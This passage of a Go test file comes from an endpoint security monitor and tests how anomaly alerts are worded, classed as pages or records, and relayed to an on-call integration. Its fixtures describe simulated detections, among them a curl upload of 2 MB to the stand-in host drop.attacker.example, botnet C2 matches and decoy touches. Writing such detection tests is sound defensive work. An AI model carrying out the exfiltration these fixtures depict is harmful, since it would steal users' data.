		add(fmt.Sprintf("h-%d", i), "HIGH", time.Hour+time.Duration(i)*time.Minute)
	}
	um, got = summary()
	if len(got) != feedAlertMax || um["more_paging"] != float64(1) || um["more"] != float64(6) {
		t.Fatalf("listed %d, more=%v more_paging=%v", len(got), um["more"], um["more_paging"])
	}
	for _, a := range got {
		if a.Severity != "HIGH" {
			t.Fatalf("a %s alert listed while a page was left out", a.Severity)
		}
	}
}

// Each alert carries its class and incident, and the new rules read in owner
// words.
func TestDescribeAlertCarriesClassAndIncident(t *testing.T) {
	t.Parallel()
	tuning := storage.DefaultDetectionTuning()
	for _, c := range []struct {
		a                     storage.AnomalyAlert
		class, incident, what string
		escalation            bool
	}{
		{storage.AnomalyAlert{ID: "d", AnomalyType: "DECOY_TOUCH", Severity: "CRITICAL", Hostname: "lap", ProcessPath: "/usr/bin/ssh", DstIP: "10.0.0.250", DstPort: 22,
			Evidence: `{"class":"page","incident":"inc-d"}`}, "page", "inc-d", "ssh on lap connected to 10.0.0.250, a decoy address nothing legitimate uses", false},
		{storage.AnomalyAlert{ID: "l", AnomalyType: "LAB_ESCAPE", Severity: "CRITICAL", Hostname: "guest", ProcessPath: "/usr/bin/python3", DstIP: "10.0.0.77", DstPort: 8080,
			Evidence: `{"class":"page","incident":"inc-x","escalation":true,"target_zone":"home","lab_escape_hosts":["10.0.0.77","10.0.0.78"]}`},
			"page", "inc-x", "python3 on lab host guest reached 2 hosts on the home network, outside the lab", true},
		{storage.AnomalyAlert{ID: "n", AnomalyType: "NEW_PLACE_UPLOAD", Severity: "HIGH", Hostname: "lap", ProcessPath: "/usr/bin/curl", DstIP: "198.51.100.40", DstPort: 443,
			Evidence: `{"class":"page","incident":"inc-n","destination":"attacker.example","first_upload_bytes":2097152,"domain":"drop.attacker.example"}`},
			"page", "inc-n", "curl on lap sent 2.0 MB to drop.attacker.example (198.51.100.40:443), somewhere this device never sent anything before", false},
		{storage.AnomalyAlert{ID: "c", AnomalyType: "COLLECTOR_HEALTH", Severity: "LOW", Hostname: "win", HeldReason: storage.HeldHunt, Evidence: `{"class":"record"}`},
			"record", "", "The OmniNull agent on win reported an impossible transfer rate, a counter glitch left out of the figures (nothing to do)", false},
		{storage.AnomalyAlert{ID: "l1", AnomalyType: "LAB_ESCAPE", Severity: "CRITICAL", Hostname: "guest", ProcessPath: "/usr/bin/curl", DstIP: "10.0.0.5", DstPort: 445,
			Evidence: `{"class":"page","incident":"inc-l1","target_zone":"infra","lab_escape_hosts":["10.0.0.5"]}`},
			"page", "inc-l1", "curl on lab host guest connected to 10.0.0.5:445 on the infrastructure network, outside the lab", false},
		{storage.AnomalyAlert{ID: "ti", AnomalyType: "THREAT_INTEL_MATCH", Severity: "CRITICAL", Hostname: "lap", ProcessPath: "/usr/bin/curl", DstIP: "203.0.113.9",
			Evidence: `{"class":"page","incident":"inc-ti","intel_confidence":90,"intel_type":"botnet_c2","action":"PERMIT"}`},
			"page", "inc-ti", "curl on lap connected to 203.0.113.9, an address on a threat list (botnet_c2, 90% sure); it was let through", false},
		{storage.AnomalyAlert{ID: "ti-low", AnomalyType: "THREAT_INTEL_MATCH", Severity: "HIGH", Hostname: "lap", DstIP: "203.0.113.9", HeldReason: storage.HeldHunt,
			Description: "Traffic matched indicator 203.0.113.9 from feed (scanner, confidence 40%). Endpoint reported action: BLOCK.", Evidence: `{"class":"record"}`},
			"record", "", "lap connected to 203.0.113.9, an address on a threat list (scanner, 40% sure); it was blocked; too weak a match to page", false},
		{storage.AnomalyAlert{ID: "o", AnomalyType: "OFF_HOURS_ACTIVITY", Severity: "LOW", Hostname: "ws", Title: "Off-hours", HeldReason: storage.HeldHunt},
			"record", "", "Off-hours on ws", false},
		{storage.AnomalyAlert{ID: "old", AnomalyType: "C2_BEACONING", Severity: "MEDIUM", Hostname: "ws", DstIP: "203.0.113.9"},
			"page", "", "A program on ws contacted 203.0.113.9 on a steady timer, the way remote-control malware checks in", false},
	} {
		got := describeAlert(c.a, tuning)
		if got.Class != c.class || got.Incident != c.incident || got.What != c.what || got.Escalation != c.escalation {
			t.Errorf("%s: class %q incident %q escalation %v what %q", c.a.ID, got.Class, got.Incident, got.Escalation, got.What)
		}
	}
	raw, _ := json.Marshal(describeAlert(storage.AnomalyAlert{ID: "x", AnomalyType: "DECOY_TOUCH"}, tuning))
	if !strings.Contains(string(raw), `"class":"page"`) {
		t.Fatalf("class is always in the feed: %s", raw)
	}
}

// Nightshift pages by class: each paging incident's newest alert is listed
// before any incident's repeats, so a medium incident is never hidden behind
// another's high repeats, and more_paging counts unlisted classed pages at any
// severity.
func TestNightshiftFeedListsEachIncidentBeforeRepeats(t *testing.T) {
	t.Parallel()
	srv, store := setupTestServer(t)
	defer store.Close()
	now := time.Now().UTC()
	add := func(id, sev, incident string, age time.Duration) {
		t.Helper()
		if err := store.CreateAnomalyAlert(storage.AnomalyAlert{ID: id, TenantID: "t-01", EndpointID: "srv-01", Hostname: "srv-01",
			AnomalyType: "LATERAL_PORT_SWEEP", Severity: sev, Title: "sweep", Description: "d", Timestamp: now.Add(-age),
			Evidence: `{"class":"page","incident":"` + incident + `"}`}); err != nil {
			t.Fatal(err)
		}
	}
	for i := 0; i < 5; i++ {
		add(fmt.Sprintf("a-%d", i), "HIGH", "inc-a", time.Duration(i+1)*time.Minute)
	}
	add("b-0", "MEDIUM", "inc-b", time.Hour)
	key := "mock_admin_token"
	summary := func() (map[string]any, []feedAlert) {
		t.Helper()
		w := feedRequest(srv, http.MethodGet, "/api/v1/health/findings", key)
		var doc feedDoc
		if err := json.Unmarshal(w.Body.Bytes(), &doc); err != nil {
			t.Fatal(err)
		}
		for _, f := range doc.Findings {
			if f.FindingInfo.UID == "ominull.anomalies.summary" {
				raw, _ := json.Marshal(f.Unmapped["alerts"])
				var got []feedAlert
				if err := json.Unmarshal(raw, &got); err != nil {
					t.Fatal(err)
				}
				return f.Unmapped, got
			}
		}
		t.Fatal("no summary finding")
		return nil, nil
	}
	um, got := summary()
	if len(got) != feedAlertMax || got[0].ID != "a-0" || got[1].ID != "b-0" || um["more_paging"] != float64(1) {
		t.Fatalf("first=%s second=%s more_paging=%v", got[0].ID, got[1].ID, um["more_paging"])
	}
	// Five high incidents fill the list: the medium incident left out is
	// still counted as a page.
	for i := 1; i < 5; i++ {
		add(fmt.Sprintf("c-%d", i), "HIGH", fmt.Sprintf("inc-c%d", i), time.Duration(10+i)*time.Minute)
	}
	um, got = summary()
	for _, a := range got {
		if a.Incident == "inc-a" && a.ID != "a-0" {
			t.Fatalf("a repeat (%s) listed while an incident was left out", a.ID)
		}
	}
	if um["more_paging"] != float64(5) { // b-0 and inc-a's four repeats
		t.Fatalf("more_paging = %v", um["more_paging"])
	}
}

// "That was me" confirms the alerts the feed says ask: a classed page at any
// severity; a record never, an unclassed medium never.
func TestRelayAlertVerdictFollowsTheClass(t *testing.T) {
	t.Parallel()
	srv, store := setupTestServer(t)
	defer store.Close()
	hour := time.Now().UTC().Add(-time.Hour)
	add := func(id, sev, evidence string) {
		if err := store.CreateAnomalyAlert(storage.AnomalyAlert{ID: id, TenantID: "t-01", EndpointID: "ws", Hostname: "ws",
			AnomalyType: "LATERAL_PORT_SWEEP", Severity: sev, Title: "alert", Timestamp: hour, Evidence: evidence}); err != nil {
			t.Fatal(err)
		}
	}
	add("medpage", "MEDIUM", `{"class":"page","incident":"inc-m"}`)
	add("record", "HIGH", `{"class":"record"}`)
	add("legacy", "MEDIUM", "")
	issue := postAdmin(srv, "/api/v1/integrations/nightshift/approval-key", ``)
	var k struct {
		Key string `json:"key"`
	}
	_ = json.Unmarshal(issue.Body.Bytes(), &k)
	req := httptest.NewRequest(http.MethodPost, "/api/v1/integrations/nightshift/alerts/verdict",
		strings.NewReader(`{"ids":["medpage","record","legacy"]}`))
	req.Header.Set("X-API-Key", k.Key)
	w := httptest.NewRecorder()
	srv.Handler().ServeHTTP(w, req)
	var out map[string]any
	_ = json.Unmarshal(w.Body.Bytes(), &out)
	if w.Code != http.StatusOK || out["confirmed"] != float64(1) || len(out["skipped"].([]any)) != 2 {
		t.Fatalf("verdict = %d %v", w.Code, out)
	}
	if _, _, _, ok := store.AnomalyResolution("medpage"); !ok {
		t.Fatal("the classed medium page was not confirmed")
	}
}

// adminSSHRule is the expected rule for routine ssh administration from the
// named hosts.
func adminSSHRule(hosts ...string) storage.ExpectedRule {
	return storage.ExpectedRule{ID: "admin-ssh", Reason: "routine administration", Findings: []string{storage.KindLateralSweep},
		Hosts: hosts, Programs: []storage.ExpectedProgram{{Path: "/usr/bin/ssh"}}, Port: 22}
}
